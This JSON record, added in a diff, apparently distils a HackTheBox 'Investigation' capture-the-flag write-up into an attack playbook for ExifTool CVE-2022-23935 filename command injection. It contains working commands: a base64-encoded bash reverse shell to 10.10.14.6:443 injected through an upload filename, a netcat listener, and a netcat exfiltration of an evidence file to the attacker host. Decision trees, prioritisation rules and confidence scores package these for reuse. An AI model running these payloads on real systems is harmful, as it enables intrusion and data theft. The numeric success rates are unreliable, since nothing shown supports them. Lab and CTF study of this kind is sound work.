@@ -1,0 +1,778 @@
+{
+  "writeup_id": "Htb_Investigation",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_exiftool_command_injection",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "command_injection",
+    "privilege_path": "web_to_user_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "exiftool_version_12.37",
+      "image_upload_functionality",
+      "php_backend_static_frontend",
+      "forensics_themed_website"
+    ],
+    "environmental_clues": [
+      "ubuntu_20.04_focal",
+      "apache_2.4.41",
+      "openssh_8.2p1",
+      "eforenzics.htb_domain",
+      "image_metadata_processing"
+    ],
+    "similar_scenarios": [
+      "exiftool_cve_exploitation",
+      "file_upload_command_injection"
+    ],
+    "unique_aspects": [
+      "windows_event_log_analysis",
+      "malware_reverse_engineering",
+      "multi_stage_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "CVE-2022-23935_Exiftool_Command_Injection",
+        "success_reason": "Vulnerable Exiftool version 12.37 processes filenames ending with '|' as shell commands",
+        "prerequisite_indicators": [
+          "exiftool_version_below_12.38",
+          "user_controlled_filename_input",
+          "perl_open_function_vulnerable_usage"
+        ],
+        "recognition_patterns": [
+          "exiftool version disclosure in output",
+          "file upload functionality present",
+          "filename processing without sanitization",
+          "perl-based application"
+        ],
+        "failure_modes": [
+          "exiftool_version_12.38_or_higher",
+          "filename_sanitization_implemented",
+          "file_extension_restrictions",
+          "command_execution_blocked"
+        ],
+        "environmental_factors": [
+          "php_web_application",
+          "apache_server_configuration",
+          "ubuntu_20.04_environment",
+          "www-data_execution_context"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Directory_Enumeration",
+        "success_reason": "Standard web directories accessible without authentication",
+        "prerequisite_indicators": [
+          "web_server_running",
+          "directory_listing_enabled_or_predictable_paths",
+          "no_access_controls"
+        ],
+        "recognition_patterns": [
+          "feroxbuster reveals upload.php",
+          "service.html contains functionality",
+          "static html with php backend"
+        ],
+        "failure_modes": [
+          "directory_listing_disabled",
+          "access_controls_implemented",
+          "rate_limiting_active"
+        ],
+        "environmental_factors": [
+          "apache_default_configuration",
+          "mixed_static_dynamic_content",
+          "minimal_security_hardening"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Exiftool version 12.37 vulnerability",
+        "discovery_method": "Version disclosure in tool output",
+        "why_critical": "Enables command injection via filename manipulation",
+        "how_to_recognize": [
+          "exiftool version number in output",
+          "file upload processing functionality",
+          "perl-based metadata extraction",
+          "version below 12.38"
+        ],
+        "follow_up_actions": [
+          "craft_malicious_filename_with_pipe",
+          "test_command_execution",
+          "establish_reverse_shell",
+          "enumerate_system_further"
+        ]
+      },
+      {
+        "discovery": "upload.php endpoint",
+        "discovery_method": "Directory enumeration with feroxbuster",
+        "why_critical": "Provides attack vector for file upload exploitation",
+        "how_to_recognize": [
+          "php file in web directory",
+          "file upload form present",
+          "image processing functionality",
+          "user input handling"
+        ],
+        "follow_up_actions": [
+          "analyze_upload_restrictions",
+          "test_file_type_validation",
+          "identify_processing_tools",
+          "craft_exploitation_payload"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "Command_Injection_via_Filename",
+        "why_possible": "Exiftool processes user-controlled filenames without proper sanitization",
+        "recognition_signs": [
+          "vulnerable_exiftool_version",
+          "filename_processing_in_perl",
+          "pipe_character_not_filtered",
+          "shell_command_execution_context"
+        ],
+        "exploitation_path": "Malicious filename → Perl open() → Command execution → www-data shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80 open on Linux host with HTTP redirect to domain",
+        "decision": "Enumerate web application and identify technology stack",
+        "reasoning": "Limited attack surface suggests web application is primary entry point",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web fails"
+          },
+          {
+            "option": "subdomain_enumeration",
+            "when": "if main site has limited functionality"
+          }
+        ],
+        "success_indicators": [
+          "technology_stack_identified",
+          "file_upload_functionality_found",
+          "version_information_disclosed"
+        ],
+        "next_decision": "analyze_file_upload_mechanism"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered file upload with Exiftool 12.37 processing",
+        "decision": "Research Exiftool version for known vulnerabilities",
+        "reasoning": "Specific version disclosure often indicates vulnerable software",
+        "confidence": 0.95,
+        "prerequisites": [
+          "exiftool_version_identified",
+          "file_upload_confirmed"
+        ],
+        "success_indicators": [
+          "cve_found_for_version"
+        ],
+        "failure_fallbacks": [
+          "file_upload_bypass",
+          "metadata_injection",
+          "path_traversal"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found CVE-2022-23935 affecting Exiftool 12.37",
+        "decision": "Exploit filename injection vulnerability for RCE",
+        "reasoning": "Direct path to code execution through filename manipulation",
+        "confidence": 0.9,
+        "prerequisites": [
+          "vulnerable_exiftool_version",
+          "file_upload_access"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "alternative_injection_methods",
+          "metadata_poisoning"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_version_disclosure_found": {
+        "action": "immediate_vulnerability_research",
+        "tools": [
+          "searchsploit",
+          "cve_databases",
+          "exploit-db"
+        ],
+        "next_phase": "exploit_development"
+      },
+      "if_file_upload_identified": {
+        "action": "analyze_processing_mechanism",
+        "purpose": "identify_backend_tools_and_versions",
+        "tools": [
+          "burp_suite",
+          "file_analysis"
+        ]
+      },
+      "if_rce_achieved": {
+        "action": "establish_persistent_shell",
+        "purpose": "maintain_access_for_privilege_escalation",
+        "tools": [
+          "reverse_shells",
+          "base64_encoding"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_research_disclosed_versions_immediately",
+        "reasoning": "version_disclosure_often_indicates_vulnerable_software",
+        "applicability": "any_technology_stack_with_version_info"
+      },
+      {
+        "rule": "test_filename_injection_on_file_processing_apps",
+        "reasoning": "common_vulnerability_in_perl_based_tools",
+        "applicability": "file_upload_with_backend_processing"
+      },
+      {
+        "rule": "use_base64_encoding_for_complex_payloads",
+        "reasoning": "bypasses_special_character_filtering",
+        "applicability": "command_injection_with_character_restrictions"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "ExifTool Command Injection",
+        "mitre_id": "T1059.004",
+        "required_services": [
+          "http",
+          "php"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "exiftool_processing",
+          "vulnerable_exiftool_version",
+          "user_controlled_filename"
+        ],
+        "success_indicators": [
+          "exiftool_version_12.37_or_vulnerable",
+          "file_upload_accepts_images",
+          "filename_processing_vulnerable",
+          "command_execution_possible"
+        ],
+        "incompatible_with": [
+          "file_upload_disabled",
+          "exiftool_patched",
+          "strict_filename_sanitization",
+          "sandboxed_processing"
+        ],
+        "confidence_boosters": [
+          "php_backend_detected",
+          "static_html_with_upload_php",
+          "exiftool_output_visible",
+          "minimal_input_validation"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Web Directory Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_listing_or_files_present"
+        ],
+        "success_indicators": [
+          "feroxbuster_finds_paths",
+          "upload_php_discovered",
+          "assets_directory_accessible"
+        ],
+        "incompatible_with": [
+          "web_application_firewall",
+          "rate_limiting_strict",
+          "all_paths_protected"
+        ],
+        "confidence_boosters": [
+          "apache_server_detected",
+          "mixed_static_dynamic_content",
+          "standard_web_structure"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "File Upload Vulnerability Assessment",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "php"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_form_present",
+          "server_side_processing",
+          "file_type_restrictions_weak"
+        ],
+        "success_indicators": [
+          "upload_form_accessible",
+          "file_processing_occurs",
+          "output_generation_visible"
+        ],
+        "incompatible_with": [
+          "upload_completely_disabled",
+          "strict_file_validation",
+          "isolated_processing_environment"
+        ],
+        "confidence_boosters": [
+          "image_processing_mentioned",
+          "forensics_tool_integration",
+          "minimal_client_side_validation"
+        ],
+        "typical_success_rate": 0.78,
+        "estimated_time": "15-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "php_web_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "apache"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "PHP"
+        ],
+        "file_indicators": [
+          "upload.php",
+          ".php"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "file_upload_service": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http"
+        ],
+        "functionality_indicators": [
+          "upload",
+          "file_processing",
+          "exiftool"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "ubuntu_linux": {
+        "service_indicators": [
+          "OpenSSH 8.2p1",
+          "Apache 2.4.41"
+        ],
+        "os_indicators": [
+          "Ubuntu"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "exiftool_command_injection",
+          "when": "file_upload_and_exiftool_detected",
+          "reason": "known_vulnerability_high_success_rate"
+        },
+        {
+          "attack": "file_upload_exploitation",
+          "when": "upload_functionality_present",
+          "reason": "direct_path_to_code_execution"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "reveals_attack_surface_and_technologies"
+        },
+        {
+          "attack": "subdomain_enumeration",
+          "when": "domain_name_discovered",
+          "reason": "may_reveal_additional_services"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "ssh_bruteforce",
+          "when": "ssh_service_detected",
+          "reason": "time_consuming_low_success_without_creds"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Exiftool Command Injection",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "burp_suite",
+            "command_template": "Intercept upload request and modify filename to '{command}|'",
+            "actual_command": "filename='echo YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxICAK | base64 -d | bash|'",
+            "output_pattern": "reverse_shell_connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "base64_encoding",
+            "command_template": "echo '{payload}' | base64 -w0",
+            "actual_command": "echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1  ' | base64 -w0",
+            "success_factors": [
+              "special_character_bypass",
+              "payload_obfuscation"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "exiftool_version_before_12.38",
+          "file_upload_functionality",
+          "filename_user_controlled"
+        ],
+        "success_indicators": [
+          "icmp_ping_response",
+          "reverse_shell_connection",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "special_characters_filtered",
+          "filename_sanitization",
+          "network_egress_blocked"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "lateral_movement",
+          "data_exfiltration"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "File Upload Command Injection",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "weaponization",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST -F 'file=@{file};filename={command}|' {target_url}",
+            "actual_command": "Modified via Burp Suite proxy intercept",
+            "output_pattern": "command_execution_via_filename",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_file_processing",
+          "perl_open_function_usage",
+          "filename_ends_with_pipe"
+        ],
+        "success_indicators": [
+          "ping_response_received",
+          "reverse_shell_established",
+          "www-data_shell_access"
+        ],
+        "common_failures": [
+          "filename_validation",
+          "character_filtering",
+          "sandboxed_execution"
+        ],
+        "follow_up_techniques": [
+          "system_enumeration",
+          "credential_harvesting",
+          "persistence_establishment"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Data Exfiltration via Netcat",
+        "mitre_id": "T1041",
+        "category": "exfiltration",
+        "phase": "actions_on_objectives",
+        "tools_used": [
+          {
+            "name": "netcat",
+            "command_template": "cat {file} | nc {attacker_ip} {port}",
+            "actual_command": "cat Windows\\ Event\\ Logs\\ for\\ Analysis.msg | nc 10.10.14.6 443",
+            "output_pattern": "file_transferred_successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "shell_access_established",
+          "target_files_identified",
+          "network_connectivity"
+        ],
+        "success_indicators": [
+          "file_received_on_attacker_machine",
+          "complete_file_transfer",
+          "readable_file_content"
+        ],
+        "common_failures": [
+          "network_filtering",
+          "file_permissions",
+          "incomplete_transfer"
+        ],
+        "follow_up_techniques": [
+          "file_analysis",
+          "credential_extraction",
+          "intelligence_gathering"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Burp Suite",
+        "use_case": "web_application_testing",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_penetration_testing"
+        ],
+        "alternatives": [
+          "owasp_zap",
+          "manual_curl_requests"
+        ],
+        "best_practices": [
+          "intercept_all_upload_requests",
+          "modify_filename_parameters",
+          "test_for_command_injection_patterns"
+        ]
+      },
+      {
+        "tool": "Exiftool",
+        "use_case": "metadata_extraction_and_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "image_forensics",
+          "metadata_analysis"
+        ],
+        "alternatives": [
+          "custom_perl_scripts",
+          "imagemagick"
+        ],
+        "best_practices": [
+          "check_version_for_vulnerabilities",
+          "test_filename_injection",
+          "validate_input_sanitization"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "exiftool_cve_2022_23935_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -p- --min-rate 10000 10.10.11.197",
+            "purpose": "Initial reconnaissance",
+            "expected_output": "Open ports 22 and 80"
+          },
+          {
+            "step": 2,
+            "command": "echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1  ' | base64 -w0",
+            "purpose": "Encode reverse shell payload",
+            "expected_output": "YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxICAK"
+          },
+          {
+            "step": 3,
+            "command": "Modify filename in Burp to: echo YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxICAK|base64 -d|bash|",
+            "purpose": "Inject command via filename parameter",
+            "expected_output": "Reverse shell connection"
+          },
+          {
+            "step": 4,
+            "command": "nc -lnvp 443",
+            "purpose": "Catch reverse shell",
+            "expected_output": "Shell as www-data user"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-25 minutes"
+      },
+      {
+        "sequence_name": "post_exploitation_enumeration",
+        "steps": [
+          {
+            "step": 1,
+            "command": "find / -user smorton 2>/dev/null",
+            "purpose": "Find files owned by target user",
+            "expected_output": "Files in /home/smorton and /usr/local/investigation"
+          },
+          {
+            "step": 2,
+            "command": "ls -la /usr/local/investigation/",
+            "purpose": "Enumerate investigation directory",
+            "expected_output": "Windows Event Logs for Analysis.msg file"
+          },
+          {
+            "step": 3,
+            "command": "cat 'Windows Event Logs for Analysis.msg' | nc 10.10.14.6 443",
+            "purpose": "Exfiltrate evidence file",
+            "expected_output": "File transferred to attacker machine"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Investigation",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2023-01-21",
+      "author": "Derezzed",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "command_injection",
+        "log_analysis",
+        "malware_analysis"
+      ],
+      "key_vulnerabilities": [
+        "exiftool_command_injection",
+        "credential_exposure_in_logs",
+        "malicious_binary_execution"
+      ],
+      "environment_type": "linux_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "file_upload_exploitation",
+        "windows_event_log_analysis",
+        "reverse_engineering"
+      ],
+      "prerequisite_knowledge": [
+        "web_exploitation",
+        "log_analysis",
+        "basic_malware_analysis"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "command_injection",
+        "digital_forensics",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "file_upload_restrictions",
+        "log_monitoring",
+        "binary_analysis"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Photobomb",
+        "Precious",
+        "Shoppy"
+      ],
+      "similarity_reasons": [
+        "file_upload_vulnerabilities",
+        "command_injection",
+        "log_analysis"
+      ],
+      "unique_aspects": [
+        "windows_event_log_analysis",
+        "exiftool_exploitation",
+        "forensics_theme"
+      ],
+      "difficulty_factors": [
+        "multi_stage_exploitation",
+        "log_analysis_skills",
+        "malware_understanding"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T17:37:50.276271",
+    "original_file": "0xdf_writeups/Htb Investigation.md",
+    "content_length": 30776,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
